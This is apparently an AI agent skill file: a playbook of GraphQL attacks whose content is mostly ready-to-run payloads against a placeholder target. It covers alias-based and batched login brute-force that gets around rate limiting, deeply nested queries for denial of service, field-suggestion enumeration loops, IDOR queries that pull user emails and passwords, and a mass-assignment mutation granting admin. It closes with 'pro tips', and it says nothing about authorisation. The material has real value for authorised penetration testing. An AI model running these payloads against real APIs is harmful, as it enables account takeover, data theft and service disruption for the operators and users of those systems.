---
name: graphql-advanced
description: Advanced GraphQL attack techniques including batching attacks, alias-based brute-force, nested query DoS, field suggestion exploitation, and mutation abuse
---

# GraphQL Advanced Attacks

Beyond basic introspection, GraphQL APIs are vulnerable to batch query abuse, alias-based authentication brute-force, deeply nested query DoS, field suggestion enumeration, and mutation-based data manipulation. These attacks exploit the flexible query language itself.

## Key Vulnerabilities

### Alias-Based Authentication Brute-Force

```graphql
# Bypass rate limiting by sending multiple login attempts in ONE request
# Each alias is a separate execution — but it's a single HTTP request
query {
  a0: login(username:"admin",password:"password1"){token}
  a1: login(username:"admin",password:"password2"){token}
  a2: login(username:"admin",password:"password3"){token}
  a3: login(username:"admin",password:"admin"){token}
  a4: login(username:"admin",password:"admin123"){token}
  # ... up to thousands of aliases per request
}
```

### Batching Attacks

```bash
# Array-based batching — multiple queries in one HTTP request
curl -sk https://TARGET/graphql -X POST -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(u:\"admin\",p:\"pass1\"){token}}"},
    {"query":"mutation{login(u:\"admin\",p:\"pass2\"){token}}"},
    {"query":"mutation{login(u:\"admin\",p:\"pass3\"){token}}"}
  ]'
```

### Deeply Nested Query DoS

```graphql
# Exploit circular references for exponential query complexity
query {
  user(id:1) {
    posts {
      author {
        posts {
          author {
            posts {
              author { name }
            }
          }
        }
      }
    }
  }
}
```

### Field Suggestion Enumeration (Introspection Disabled)

```bash
# Even with introspection disabled, GraphQL returns suggestions for typos
curl -sk https://TARGET/graphql -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schem}"}'
# Response: "Did you mean __schema?"

# Enumerate fields
for field in id name email password token role admin secret key flag; do
  curl -sk https://TARGET/graphql -X POST -H "Content-Type: application/json" \
    -d "{\"query\":\"{user{${field}x}}\"}" 2>/dev/null | grep -o "Did you mean.*\"" | head -1
done
```

### IDOR via GraphQL

```bash
# Test object access with different IDs
for id in 1 2 3 4 5 0 99999; do
  curl -sk https://TARGET/graphql -X POST -H "Content-Type: application/json" \
    -d "{\"query\":\"{user(id:$id){id email password role}}\"}"
done
```

### Mutation Abuse

```bash
# Mass assignment via mutations
curl -sk https://TARGET/graphql -X POST -H "Content-Type: application/json" \
  -d '{"query":"mutation{updateUser(id:1,input:{role:\"admin\",isAdmin:true}){id role}}"}'
```

## Testing Methodology

1. **Test introspection** → if disabled, use field suggestion enumeration
2. **Map all queries and mutations** via introspection or suggestion-based discovery
3. **Test alias brute-force** on auth endpoints — bypass rate limiting
4. **Test nested queries** for DoS if circular refs exist
5. **Test every query/mutation** for IDOR, auth bypass, and mass assignment

## Impact

- **High**: Authentication brute-force via alias batching (bypasses rate limiting)
- **High**: DoS via deeply nested or complex queries
- **High**: IDOR and data theft via direct object queries
- **Medium**: Schema enumeration even when introspection is disabled

## Pro Tips

1. Alias brute-force is the most underrated GraphQL attack — it bypasses per-request rate limiting
2. Field suggestions work even when introspection is disabled — fuzz field names with intentional typos
3. Test query cost/complexity limits — many APIs don't implement them
4. Always test mutations with extra fields for mass assignment (role, isAdmin, permissions)
5. GraphQL subscriptions (WebSocket) have their own auth bypass surface — test separately
